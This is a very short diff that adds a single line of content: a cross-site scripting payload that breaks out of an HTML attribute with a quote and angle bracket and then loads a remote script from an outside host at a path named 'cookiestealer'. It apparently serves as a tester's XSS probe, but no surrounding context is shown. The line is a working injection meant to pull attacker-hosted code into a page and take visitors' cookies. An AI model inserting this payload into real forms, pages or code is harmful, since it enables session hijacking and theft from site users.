@@ -1,0 +1,2 @@
+
+'><script src='http://qa.evgmoskalenko.com/cookiestealer/test.js'></script>
